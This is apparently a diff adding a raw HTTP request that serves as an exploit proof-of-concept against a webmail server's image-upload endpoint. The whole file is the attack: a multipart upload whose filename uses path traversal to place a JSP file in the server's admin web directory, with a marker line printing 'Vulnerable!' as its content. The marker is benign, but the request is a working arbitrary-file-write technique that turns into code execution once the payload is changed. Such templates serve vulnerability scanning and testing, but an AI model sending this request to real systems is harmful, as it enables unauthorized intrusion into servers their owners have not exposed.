@@ -1,0 +1,22 @@
+POST /webadmin/service/openapiservice?func=upload:letterImageUpload HTTP/1.1
+Host:
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="imageX"
+
+0
+------WebKitFormBoundary
+Content-Disposition: form-data; name="imageY"
+
+0
+------WebKitFormBoundary
+Content-Disposition: form-data; name="submit"
+
+提交
+------WebKitFormBoundary
+Content-Disposition: form-data; name="filename"; filename="../../../../../web/webmailsvr/admin/12.jsp"
+Content-Type: text/plain
+
+<% out.println("Vulnerable!"); %>
+------WebKitFormBoundary--
